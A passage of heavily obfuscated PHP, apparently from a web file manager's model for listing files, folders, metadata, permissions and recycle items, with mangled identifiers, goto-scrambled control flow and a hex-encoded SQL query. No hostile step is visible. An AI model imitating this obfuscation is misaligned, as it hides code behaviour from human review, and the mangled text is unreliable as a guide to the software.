$ešÉ’·Ÿ¼î[$b”°¶à„¾[85]]; if (!$bçÜ»©µĞ„) { continue; } if (!isset($A“çŠ‚ïã[$bçÜ»©µĞ„])) { $A“çŠ‚ïã[$bçÜ»©µĞ„] = array(); } $A“çŠ‚ïã[$bçÜ»©µĞ„][] = $ešÉ’·Ÿ¼î[$b”°¶à„¾[402]]; } $E¤§ˆáš’à = array(); goto b’æèÍ•Š; CÈº¹ƒªºÌ: $E§®•×ÕÁ = array_to_keyvalue($E´™¯Ò¯•Ò[$b”°¶à„¾[83]], $b”°¶à„¾[43], $b”°¶à„¾[378]); $EÁ´­ª²¼» = array_merge($E§®•×ÕÁ, $bÇº÷ğÙ”Œ); foreach ($E¤§ˆáš’à as $bçÜ»©µĞ„) { if (!in_array($bçÜ»©µĞ„, $EÁ´­ª²¼»)) { $aÉ¸ØÆù¬Î[] = $bçÜ»©µĞ„; } } goto DÔ¼Ìî–é‚; dÉì«îŞìæ: $b”°¶à„¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($c‡Ê„¤‹°· && !is_array($c‡Ê„¤‹°·)) { $c‡Ê„¤‹°· = array($c‡Ê„¤‹°·); } $EŞŠŸî© = Model($b”°¶à„¾[401])->listData(); goto dî‰™µ¢¼Ñ; ağƒ”ñÅ‡: } public function listUserRecycle() { $D„ˆ™æ¾Ë° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a±§³•²²… = Model($D„ˆ™æ¾Ë°[404])->listData(); if (!$a±§³•²²…) { return array(); } $d‡ªé›«µ“ = array($D„ˆ™æ¾Ë°[392] => array($D„ˆ™æ¾Ë°[393], $a±§³•²²…), $D„ˆ™æ¾Ë°[405] => 1); return $this->listSource($d‡ªé›«µ“); } public function listSource($b×ã·Š³ğ, $f©È¢ôó‹¬ = 3000) { goto D¼“àÉ¶å; eöÕÂŒ‹¥ñ: return $FŒ’¿Œ×´Ò; goto A±Í“ø†è; D¼“àÉ¶å: $C×ùç‰äˆç =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($b×ã·Š³ğ[$C×ùç‰äˆç[406]])) { $b×ã·Š³ğ[$C×ùç‰äˆç[406]] = 0; } $d…††¾à = $C×ùç‰äˆç[407]; goto fÈ‡èŠç; fÈ‡èŠç: $FŒ’¿Œ×´Ò = $this->field($d…††¾à)->_makeOrder()->where($b×ã·Š³ğ)->selectPage($f©È¢ôó‹¬); $this->_listDataApply($FŒ’¿Œ×´Ò[$C×ùç‰äˆç[363]]); $this->_listMake($FŒ’¿Œ×´Ò); goto eöÕÂŒ‹¥ñ; A±Í“ø†è: } protected function _makeOrder() { goto B©»ÅôÛó; cå¢“å£ÚÉ: $aÍ‹ÆÕ§¯Ø = array($cŠâÚ ß§Ò[411] => $cŠâÚ ß§Ò[412], $cŠâÚ ß§Ò[413] => $cŠâÚ ß§Ò[414]); $DàµÒÎÀö = array($cŠâÚ ß§Ò[38] => $cŠâÚ ß§Ò[38], $cŠâÚ ß§Ò[87] => $cŠâÚ ß§Ò[87], $cŠâÚ ß§Ò[170] => $cŠâÚ ß§Ò[381], $cŠâÚ ß§Ò[387] => $cŠâÚ ß§Ò[387], $cŠâÚ ß§Ò[415] => $cŠâÚ ß§Ò[388], $cŠâÚ ß§Ò[197] => $cŠâÚ ß§Ò[197], $cŠâÚ ß§Ò[117] => $cŠâÚ ß§Ò[117]); $b¶•„’áÌ = Input::get($cŠâÚ ß§Ò[416], $cŠâÚ ß§Ò[17], $fë„“™ñ‚, array_keys($DàµÒÎÀö)); goto c­‡Ëœ÷á; B©»ÅôÛó: $cŠâÚ ß§Ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fë„“™ñ‚ = Model($cŠâÚ ß§Ò[408])->get($cŠâÚ ß§Ò[409]); $Fã¸”Ş­õ = Model($cŠâÚ ß§Ò[408])->get($cŠâÚ ß§Ò[410]); goto cå¢“å£ÚÉ; c­‡Ëœ÷á: $EŸÓ¥¢èáñ = Input::get($cŠâÚ ß§Ò[417], $cŠâÚ ß§Ò[17], $Fã¸”Ş­õ, array_keys($aÍ‹ÆÕ§¯Ø)); if (!in_array($b¶•„’áÌ, array_keys($DàµÒÎÀö))) { $b¶•„’áÌ = $cŠâÚ ß§Ò[38]; } if (!in_array($EŸÓ¥¢èáñ, array_keys($aÍ‹ÆÕ§¯Ø))) { $b¶•„’áÌ = $cŠâÚ ß§Ò[411]; } goto C—ä¥ôë´ƒ; C—ä¥ôë´ƒ: if ($b¶•„’áÌ == $cŠâÚ ß§Ò[38]) { } $FÉ³İÈäŠ = $cŠâÚ ß§Ò[418] . $DàµÒÎÀö[$b¶•„’áÌ] . $cŠâÚ ß§Ò[60] . $aÍ‹ÆÕ§¯Ø[$EŸÓ¥¢èáñ]; return $this->order(rtrim(trim($FÉ³İÈäŠ), $cŠâÚ ß§Ò[57])); goto d›½Á”ä‹Ñ; d›½Á”ä‹Ñ: } protected function _listDataApplyItem($c“áä‡ó¸Ç, $EÂ¨ø¢œÍ = false) { $aÕ„Ë Û¡¹ = array($c“áä‡ó¸Ç); $this->_listDataApply($aÕ„Ë Û¡¹, $EÂ¨ø¢œÍ); return $aÕ„Ë Û¡¹[0]; } protected function _listDataApply(&$EÇ‰Ù©¤Í‰, $fãïØ‡ ğÍ = false) { goto C™±Ü§œßâ; F°öÈäê: $this->_listAppendPath($EÇ‰Ù©¤Í‰); $this->_listAppendAuth($EÇ‰Ù©¤Í‰); $this->_listAppendSourceInfo($EÇ‰Ù©¤Í‰, $eèŞÍ‘§ÊĞ); goto d„¬Â‡Ö‹Ç; C›“”ëÜÚ­: $eèŞÍ‘§ÊĞ = array_unique($eèŞÍ‘§ÊĞ); $this->_listSourceCache($EÇ‰Ù©¤Í‰); if (!$fãïØ‡ ğÍ) { $this->_listAppendMeta($EÇ‰Ù©¤Í‰, $eèŞÍ‘§ÊĞ); $this->_listAppendFileMeta($EÇ‰Ù©¤Í‰, $eèŞÍ‘§ÊĞ); $this->_listAppendChildren($EÇ‰Ù©¤Í‰, $eèŞÍ‘§ÊĞ); } goto F°öÈäê; d„¬Â‡Ö‹Ç: $this->_listAppendUser($EÇ‰Ù©¤Í‰); $this->_listFilterInfo($EÇ‰Ù©¤Í‰, $fãïØ‡ ğÍ); goto d§·Ş‚Èİ¯; C™±Ü§œßâ: $FçİØÂë— =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$EÇ‰Ù©¤Í‰) { $EÇ‰Ù©¤Í‰ = array(); return; } $eèŞÍ‘§ÊĞ = array_to_keyvalue($EÇ‰Ù©¤Í‰, $FçİØÂë—[43], $FçİØÂë—[378]); goto C›“”ëÜÚ­; d§·Ş‚Èİ¯: } protected function _listSourceCache($A¨î„Ï˜À) { $B´Ğğ³Œ÷Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($A¨î„Ï˜À as $A÷Íä«ˆ‘ ) { self::$cacheSourceInfo[$B´Ğğ³Œ÷Õ[419] . $A÷Íä«ˆ‘ [$B´Ğğ³Œ÷Õ[378]]] = $A÷Íä«ˆ‘ ; } } protected function _listFilterInfo(&$D™ì‰Û½Ã·, $a¾¾ Ø–ä = false) { $FÅÏƒ…ò¨š =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($D™ì‰Û½Ã· as &$DÜÇİ¯é) { $DÜÇİ¯é = $this->pathInfoFilter($DÜÇİ¯é); self::$cachePathInfo[$FÅÏƒ…ò¨š[420] . intval($a¾¾ Ø–ä) . $FÅÏƒ…ò¨š[421] . $DÜÇİ¯é[$FÅÏƒ…ò¨š[378]]] = $DÜÇİ¯é; } unset($DÜÇİ¯é); } protected function _listMake(&$e•³ŠèùÕ) { $fªèÙ÷¿’Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e•³ŠèùÕ[$fªèÙ÷¿’Ÿ[84]] = array(); $e•³ŠèùÕ[$fªèÙ÷¿’Ÿ[83]] = array(); foreach ($e•³ŠèùÕ[$fªèÙ÷¿’Ÿ[363]] as $FÖ³¢•‰§º) { $BÓÔÖµŞÉµ = $FÖ³¢•‰§º[$fªèÙ÷¿’Ÿ[379]] == 1 ? $fªèÙ÷¿’Ÿ[84] : $fªèÙ÷¿’Ÿ[83]; $e•³ŠèùÕ[$BÓÔÖµŞÉµ][] = $FÖ³¢•‰§º; } unset($e•³ŠèùÕ[$fªèÙ÷¿’Ÿ[363]]); } protected function _listAppendMeta(&$b¦¦Ë„ô«Ä, $côå±ó¯) { goto A——îÒ•; Eî¿¤Í„ƒ: foreach ($FˆøÙ†éô as $DŠÏÀ—¯¦Å) { if (!isset($aë‹±‚ßÊ[$DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[378]]])) { $aë‹±‚ßÊ[$DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[378]]] = array(); } if (in_array($DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[99]], $eƒëİ«ï³¯)) { continue; } $aë‹±‚ßÊ[$DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[378]]][$DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[99]]] = $DŠÏÀ—¯¦Å[$EÛÃãÉÒ—[368]]; } foreach ($b¦¦Ë„ô«Ä as &$Fó…ê¢Ù÷Ñ) { $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[426]] = !1; if (isset($aë‹±‚ßÊ[$Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[378]]])) { $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[426]] = $aë‹±‚ßÊ[$Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[378]]]; } if ($this->fileIsLock($Fó…ê¢Ù÷Ñ) && $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[385]]) { $d„¡½ö–¯± = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[385]][$EÛÃãÉÒ—[386]] = AuthModel::authDisable($Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[385]][$EÛÃãÉÒ—[386]], $d„¡½ö–¯±); $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[385]][$EÛÃãÉÒ—[427]][$EÛÃãÉÒ—[385]] = $Fó…ê¢Ù÷Ñ[$EÛÃãÉÒ—[385]][$EÛÃãÉÒ—[386]]; } } unset($Fó…ê¢Ù÷Ñ); goto c´¥—¹¶Ò×; F¶Ş¥‹Ğ‚Û: if (!$FˆøÙ†éô) { return; } $eƒëİ«ï³¯ = array($EÛÃãÉÒ—[424], $EÛÃãÉÒ—[425]); $aë‹±‚ßÊ = array(); goto Eî¿¤Í„ƒ; A——îÒ•: $EÛÃãÉÒ— =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B·àó… ó˜ = array($EÛÃãÉÒ—[392] => array($EÛÃãÉÒ—[393], $côå±ó¯)); $FˆøÙ†éô = Model($EÛÃãÉÒ—[422])->field($EÛÃãÉÒ—[423])->where($B·àó… ó˜)->select(); goto F¶Ş¥‹Ğ‚Û; c´¥—¹¶Ò×: } protected function _listAppendFileMeta(&$DœÚÍ‘ÕÄ, $e±ä•–èƒ÷) { goto DëŒÍ¾ î; Bº·’¯÷¥é: foreach ($DœÚÍ‘ÕÄ as &$CªÓˆİ‹Ä) { goto cÅ™ñ¯§‰…; fªï‡áŞ¤: $e¬š‡ÅÕğÄ[$cÃ¡…œƒÆ[87]] = $CªÓˆİ‹Ä[$cÃ¡…œƒÆ[87]]; $e¬š‡ÅÕğÄ[$cÃ¡…œƒÆ[38]] = $CªÓˆİ‹Ä[$cÃ¡…œƒÆ[38]]; self::$cacheFileInfo[$cÃ¡…œƒÆ[434] . $cåï†ù¢Œ] = array_merge(array(), $e¬š‡ÅÕğÄ); goto DÊšè½â„‰; DÊšè½â„‰: unset($fÛ­àšä‰[$cåï†ù¢Œ][$cÃ¡…œƒÆ[85]]); $D¯İÓÒ†ÁÖ = is_array($dòª£çŞØ[$cåï†ù¢Œ]) ? $dòª£çŞØ[$cåï†ù¢Œ] : array(); $CªÓˆİ‹Ä[$cÃ¡…œƒÆ[172]] = array_merge($D¯İÓÒ†ÁÖ, $fÛ­àšä‰[$cåï†ù¢Œ]); goto BŒæÈœ´ƒ; BŒæÈœ´ƒ: if (isset($CªÓˆİ‹Ä[$cÃ¡…œƒÆ[172]][$cÃ¡…œƒÆ[435]])) { $CªÓˆİ‹Ä[$cÃ¡…œƒÆ[435]] = json_decode($CªÓˆİ‹Ä[$cÃ¡…œƒÆ[172]][$cÃ¡…œƒÆ[435]], !0); unset($CªÓˆİ‹Ä[$cÃ¡…œƒÆ[172]][$cÃ¡…œƒÆ[435]]); } goto bÆ¾ëŒ‘ğ³; cÅ™ñ¯§‰…: $cåï†ù¢Œ = $CªÓˆİ‹Ä[$cÃ¡…œƒÆ[428]]; if (!$cåï†ù¢Œ || !isset($fÛ­àšä‰[$cåï†ù¢Œ])) { continue; } $e¬š‡ÅÕğÄ = $fÛ­àšä‰[$cåï†ù¢Œ]; goto fªï‡áŞ¤; bÆ¾ëŒ‘ğ³: } unset($CªÓˆİ‹Ä); goto fÎ·ŸÛòĞê; eã¥æÖ˜ù: if (!$eòÔº‡…¬œ) { return; } $B´¾¸ÑİÆ† = array($cÃ¡…œƒÆ[429] => array($cÃ¡…œƒÆ[393], $eòÔº‡…¬œ)); $FÅÓŞåİ‰‘ = $cÃ¡…œƒÆ[430]; goto C•µ›ô½ƒ; a¾Ê©í¿±: $D»Ô†¹éœ¬ = $D»Ô†¹éœ¬ ? $D»Ô†¹éœ¬ : array(); $dòª£çŞØ = array(); foreach ($D»Ô†¹éœ¬ as $F˜Ñœ˜ˆß’) { if (!isset($dòª£çŞØ[$F˜Ñœ˜ˆß’[$cÃ¡…œƒÆ[428]]])) { $dòª£çŞØ[$F˜Ñœ˜ˆß’[$cÃ¡…œƒÆ[428]]] = array(); } $dòª£çŞØ[$F˜Ñœ˜ˆß’[$cÃ¡…œƒÆ[428]]][$F˜Ñœ˜ˆß’[$cÃ¡…œƒÆ[99]]] = $F˜Ñœ˜ˆß’[$cÃ¡…œƒÆ[368]]; } goto Bº·’¯÷¥é; DëŒÍ¾ î: $cÃ¡…œƒÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eòÔº‡…¬œ = array_to_keyvalue($DœÚÍ‘ÕÄ, $cÃ¡…œƒÆ[43], $cÃ¡…œƒÆ[428]); $eòÔº‡…¬œ = array_filter(array_unique($eòÔº‡…¬œ)); goto eã¥æÖ˜ù; C•µ›ô½ƒ: $fÛ­àšä‰ = Model($cÃ¡…œƒÆ[431])->field($FÅÓŞåİ‰‘)->where($B´¾¸ÑİÆ†)->select(); $fÛ­àšä‰ = array_to_keyvalue($fÛ­àšä‰, $cÃ¡…œƒÆ[428]); $D»Ô†¹éœ¬ = Model($cÃ¡…œƒÆ[432])->field($cÃ¡…œƒÆ[433])->where($B´¾¸ÑİÆ†)->select(); goto a¾Ê©í¿±; fÎ·ŸÛòĞê: } protected function _listAppendSourceInfo(&$eö­Ò¬…éİ, $FŠ¹ö¦“¸¾) { goto FŒ¦å—³Ä‘; eÕ˜í±Èù¢: return $eö­Ò¬…éİ; goto eìä¬Ÿ¦‹œ; FŒ¦å—³Ä‘: $B›‘õÉÌÔÑ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($B›‘õÉÌÔÑ[436])) { return; } $d¸Ë¦¬²¸ = Model($B›‘õÉÌÔÑ[437])->listData(); goto A®–¯½§; Då–¦ôŠ: $b„‘¥İÇ¯ = array_to_keyvalue($d¸Ë¦¬²¸, $B›‘õÉÌÔÑ[376]); $EÀ½Œã„Áí = array_to_keyvalue_group($bÀ¹Ìâ¯îî, $B›‘õÉÌÔÑ[85], $B›‘õÉÌÔÑ[402]); $Bšòœ§õõÖ = array_to_keyvalue($EŠÆ¯œ Ï‘, $B›‘õÉÌÔÑ[85]); goto EµÊà“íÄ; A®–¯½§: $bÀ¹Ìâ¯îî = Model($B›‘õÉÌÔÑ[401])->listData(); $EŠÆ¯œ Ï‘ = Model($B›‘õÉÌÔÑ[390])->listData(); $cÆéçŒäó¶ = Model($B›‘õÉÌÔÑ[438])->listSimple(); goto Då–¦ôŠ; EµÊà“íÄ: $fğˆ…¼£Ù = array_to_keyvalue_group($cÆéçŒäó¶, $B›‘õÉÌÔÑ[378]); foreach ($eö­Ò¬…éİ as &$c’‡‹­ª±Ä) { $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]] = array($B›‘õÉÌÔÑ[439] => 0, $B›‘õÉÌÔÑ[440] => 0, $B›‘õÉÌÔÑ[441] => 0); if (isset($Bšòœ§õõÖ[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]])) { $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[442]] = 1; $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[443]] = $Bšòœ§õõÖ[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]][$B›‘õÉÌÔÑ[38]]; } if (isset($EÀ½Œã„Áí[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]])) { $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[444]] = array(); foreach ($EÀ½Œã„Áí[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]] as $aİÅ·óÂ¯) { $B£ŠéÏì£é = $b„‘¥İÇ¯[$aİÅ·óÂ¯]; $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[444]][] = array($B›‘õÉÌÔÑ[445] => $B£ŠéÏì£é[$B›‘õÉÌÔÑ[376]], $B›‘õÉÌÔÑ[395] => $B£ŠéÏì£é[$B›‘õÉÌÔÑ[38]], $B›‘õÉÌÔÑ[446] => $B£ŠéÏì£é[$B›‘õÉÌÔÑ[447]]); } } if (isset($fğˆ…¼£Ù[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]])) { $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[448]] = array(); foreach ($fğˆ…¼£Ù[$c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[378]]] as $a·áÈìŠ) { $c’‡‹­ª±Ä[$B›‘õÉÌÔÑ[400]][$B›‘õÉÌÔÑ[448]] = array($B›‘õÉÌÔÑ[449] => $a·áÈìŠ[$B›‘õÉÌÔÑ[450]], $B›‘õÉÌÔÑ[451] => $a·áÈìŠ[$B›‘õÉÌÔÑ[452]], $B›‘õÉÌÔÑ[453] => $a·áÈìŠ[$B›‘õÉÌÔÑ[378]], $B›‘õÉÌÔÑ[454] => $a·áÈìŠ[$B›‘õÉÌÔÑ[455]], $B›‘õÉÌÔÑ[456] => $a·áÈìŠ[$B›‘õÉÌÔÑ[457]], $B›‘õÉÌÔÑ[458] => $a·áÈìŠ[$B›‘õÉÌÔÑ[458]], $B›‘õÉÌÔÑ[459] => $a·áÈìŠ[$B›‘õÉÌÔÑ[459]]); } } } unset($c’‡‹­ª±Ä); goto eÕ˜í±Èù¢; eìä¬Ÿ¦‹œ: } protected function _listAppendChildren(&$EŒ…¿×¯, $aÔ„ÒŠäÊ) { goto BÕ²ÔÏí¬ù; B³»ô‘óë“: $e«ó÷£„”Ë = 1024 * 50; $EŒ…¿×¯ = is_array($EŒ…¿×¯) ? $EŒ…¿×¯ : array(); $D©Ò’¨ÅÎ‡ = count($EŒ…¿×¯); goto cÀ¯Òˆ­Œ; BÕ²ÔÏí¬ù: $Aì»ĞÂÛö =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¸¤Ğİµ¡ = $Aì»ĞÂÛö[370]; $fá†Š®Å–Ë = array(); goto B³»ô‘óë“; cÀ¯Òˆ­Œ: $Dø¢èğâì– = $this->tablePrefix . $this->tableName; for ($aŒ¹•™´Ø = 0; $aŒ¹•™´Ø < $D©Ò’¨ÅÎ‡; $aŒ¹•™´Ø++) { $bŒ®İãùœç = intval($EŒ…¿×¯[$aŒ¹•™´Ø][$Aì»ĞÂÛö[406]]); if ($EŒ…¿×¯[$aŒ¹•™´Ø][$Aì»ĞÂÛö[379]]) { $D ³…ÃÎÜ¢ = $EŒ…¿×¯[$aŒ¹•™´Ø][$Aì»ĞÂÛö[378]]; $E¸¤Ğİµ¡ .= "\123\105\x4c\105\103\x54\40\52\40\x46\x52\x4f\x4d\40\50\x53\x45\x4c\x45\x43\124\40\x27{$D ³…ÃÎÜ¢}\x5f\150\141\163\106\x69\154\x65\x27\40\x61\163\40\150\x61\x73\x2c\x63\x6f\165\156\x74\x28\61\x29\x20\141\163\x20\150\x61\x73\x43\157\165\x6e\164\x20\x46\122\x4f\115\40\140{$Dø¢èğâì–}\140\40\12\11\x9\x9\11\11\x77\x68\x65\x72\x65\x20\x70\141\162\x65\x6e\x74\111\x44\x3d{$D ³…ÃÎÜ¢}\x20\141\156\144\x20\x69\x73\106\157\x6c\x64\x65\x72\75\x30\x20\141\156\x64\x20\151\163\104\145\154\x65\164\145\x3d{$bŒ®İãùœç}\x29\40\x61\x73\40\x74\x62\61\137{$D ³…ÃÎÜ¢}\40\x75\156\x69\157\156\x20\141\x6c\x6c\40\xa\x9\11\x9\11\11\123\105\114\105\x43\124\x20\52\40\x46\x52\x4f\115\x20\50\x53\x45\114\105\x43\x54\x20\47{$D ³…ÃÎÜ¢}\137\150\x61\163\x46\x6f\154\x64\x65\x72\x27\x20\x61\x73\x20\150\x61\163\106\151\154\145\54\143\x6f\165\156\x74\x28\61\51\40\x61\163\40\x68\141\163\x43\x6f\x75\156\164\40\x46\x52\x4f\115\x20\x60{$Dø¢èğâì–}\x60\40\xa\11\x9\11\11\11\x77\150\x65\162\x65\40\160\141\162\x65\x6e\x74\111\x44\75{$D ³…ÃÎÜ¢}\40\141\156\x64\x20\151\x73\106\x6f\x6c\x64\145\162\75\61\x20\141\156\144\x20\151\163\104\x65\x6c\x65\164\x65\x3d{$bŒ®İãùœç}\51\40\141\x73\x20\164\142\x32\137{$D ³…ÃÎÜ¢}\x20\x75\156\x69\157\x6e\x20\x61\x6c\154\40"; } if ((strlen($E¸¤Ğİµ¡) >= $e«ó÷£„”Ë || $aŒ¹•™´Ø == $D©Ò’¨ÅÎ‡ - 1) && $E¸¤Ğİµ¡) { $E¸¤Ğİµ¡ = substr($E¸¤Ğİµ¡, 0, -strlen($Aì»ĞÂÛö[460])); $fÔ£°¢›Ü = $this->query($E¸¤Ğİµ¡); $fá†Š®Å–Ë = array_merge($fá†Š®Å–Ë, $fÔ£°¢›Ü); $E¸¤Ğİµ¡ = $Aì»ĞÂÛö[43]; } } $fá†Š®Å–Ë = array_to_keyvalue($fá†Š®Å–Ë, $Aì»ĞÂÛö[461]); goto Eò¥ö¯ÆÌö; Eò¥ö¯ÆÌö: foreach ($EŒ…¿×¯ as &$f‡ÔÜÒ¦•§) { if ($f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[379]]) { unset($f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[381]]); $f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[202]] = intval($fá†Š®Å–Ë[$f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[378]] . $Aì»ĞÂÛö[462]][$Aì»ĞÂÛö[463]]); $f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[201]] = intval($fá†Š®Å–Ë[$f‡ÔÜÒ¦•§[$Aì»ĞÂÛö[378]] . $Aì»ĞÂÛö[464]][$Aì»ĞÂÛö[463]]); } } unset($f‡ÔÜÒ¦•§); goto bŒÖÉÙÖ; bŒÖÉÙÖ: } protected function _listAppendAuth(&$eÌã‰Æ¬Óé) { goto a¬•ÂŸš£„; a¬•ÂŸš£„: $C˜°®ï æ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($C˜°®ï æ”[436])) { return; } $B‹„¤Í‚Ÿ = array(); goto e‹‰‰ĞŒøÂ; e‹‰‰ĞŒøÂ: foreach ($eÌã‰Æ¬Óé as $d«ÄŒ§‡ÅÚ) { if ($d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[380]] == self::TYPE_GROUP) { $B‹„¤Í‚Ÿ[] = $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[378]]; } } if (!$B‹„¤Í‚Ÿ) { return; } $EºÙĞÏåÈ¾ = array_to_keyvalue($eÌã‰Æ¬Óé, $C˜°®ï æ”[378]); goto f¦ˆÌ‹Ø; f¦ˆÌ‹Ø: $Bëà—“°†— = Model($C˜°®ï æ”[465])->getSourceList($B‹„¤Í‚Ÿ, $EºÙĞÏåÈ¾); foreach ($eÌã‰Æ¬Óé as $B¦ÊÕ²Ğ‰Í => &$d«ÄŒ§‡ÅÚ) { $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]] = $Bëà—“°†—[$d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[378]]]; if (!$d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]] && $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[380]] == self::TYPE_GROUP) { $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]] = Action($C˜°®ï æ”[466])->pathGroupAuthMake($d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[467]]); if (!$d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]] && !_get($GLOBALS, $C˜°®ï æ”[468])) { $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[199]] = !1; $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[198]] = !1; } } if ($d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]]) { $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[199]] = AuthModel::authCheckEdit($d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]][$C˜°®ï æ”[386]]); $d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[198]] = AuthModel::authCheckView($d«ÄŒ§‡ÅÚ[$C˜°®ï æ”[385]][$C˜°®ï æ”[386]]); } $this->groupPathDisplay($d«ÄŒ§‡ÅÚ); } unset($d«ÄŒ§‡ÅÚ); goto f•ÖÁ°Á; f•ÖÁ°Á: } public function groupPathDisplay(&$BÁè…œ«á½) { goto E´®ÌÉäÇŠ; aºš³‡¿: $BÁè…œ«á½[$bÂÇ¢“Ÿ¸[475]] = $cì®¢‘ëª½ . $FÂ”õäÅá†[$bÂÇ¢“Ÿ¸[400]][$bÂÇ¢“Ÿ¸[378]]; goto Aè«êÁ‡ˆÒ; E´®ÌÉäÇŠ: $bÂÇ¢“Ÿ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($BÁè…œ«á½[$bÂÇ¢“Ÿ¸[380]] != self::TYPE_GROUP) { return; } $FÂ”õäÅá† = Model($bÂÇ¢“Ÿ¸[469])->getInfo($BÁè…œ«á½[$bÂÇ¢“Ÿ¸[467]]); goto F„Œ§ª¿Ø; F„Œ§ª¿Ø: $fÔ†ÆŠõ = $this->parentLevelArray($FÂ”õäÅá†[$bÂÇ¢“Ÿ¸[470]]); $cì®¢‘ëª½ = $bÂÇ¢“Ÿ¸[43]; foreach ($fÔ†ÆŠõ as $BÕ Œ÷ï´è) { $cŞáœÓâõ¨ = Model($bÂÇ¢“Ÿ¸[469])->getInfo($BÕ Œ÷ï´è); $cì®¢‘ëª½ .= $cŞáœÓâõ¨[$bÂÇ¢“Ÿ¸[400]][$bÂÇ¢“Ÿ¸[378]] . $bÂÇ¢“Ÿ¸[57]; } goto BÍ–äá‘Ğ; BÍ–äá‘Ğ: $BÁè…œ«á½[$bÂÇ¢“Ÿ¸[471]] = $FÂ”õäÅá†[$bÂÇ¢“Ÿ¸[472]]; $BÁè…œ«á½[$bÂÇ¢“Ÿ¸[389]] = $FÂ”õäÅá†[$bÂÇ¢“Ÿ¸[470]]; $BÁè…œ«á½[$bÂÇ¢“Ÿ¸[473]] = $FÂ”õäÅá†[$bÂÇ¢“Ÿ¸[474]]; goto aºš³‡¿; Aè«êÁ‡ˆÒ: } protected function _listAppendPath(&$DÔ™¿åÎ°ß) { goto cõä´òÙ…; EâíÑÕëè¿: foreach ($DÔ™¿åÎ°ß as &$f®””’†«ç) { $Få±¯Î±¨¹[$f®””’†«ç[$Bª„‘±Î[378]]] = $f®””’†«ç[$Bª„‘±Î[38]]; $Aëà„í…‰¢ = $this->parentLevelArray($f®””’†«ç[$Bª„‘±Î[470]]); foreach ($Aëà„í…‰¢ as $FòŠ¡ê†¯Ş => $BçÜ¥Ìµ„‘) { if ($FòŠ¡ê†¯Ş != 0 && !isset($Få±¯Î±¨¹[$BçÜ¥Ìµ„‘])) { $Dè‘æ† ô¸[] = $BçÜ¥Ìµ„‘; } } } unset($f®””’†«ç); if (count($Dè‘æ† ô¸) > 0) { $eÌ»°Ï–† = array($Bª„‘±Î[392] => array($Bª„‘±Î[393], $Dè‘æ† ô¸)); if (count($Dè‘æ† ô¸) == 1) { $FäÅ¼¯‡Æ¿ = $this->sourceInfo($Dè‘æ† ô¸[0]); $DñÖ³±õ = is_array($FäÅ¼¯‡Æ¿) ? array($FäÅ¼¯‡Æ¿) : !1; } else { $DñÖ³±õ = $this->field($Bª„‘±Î[476])->where($eÌ»°Ï–†)->select(); } $f²×ÏŞ‘âª = array_to_keyvalue($DñÖ³±õ, $Bª„‘±Î[378], $Bª„‘±Î[38]); $Få±¯Î±¨¹ = array_merge_index($Få±¯Î±¨¹, $f²×ÏŞ‘âª); } goto CøÀ·ÈÈ—Ş; CøÀ·ÈÈ—Ş: $D‡¹Ç›í”î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach 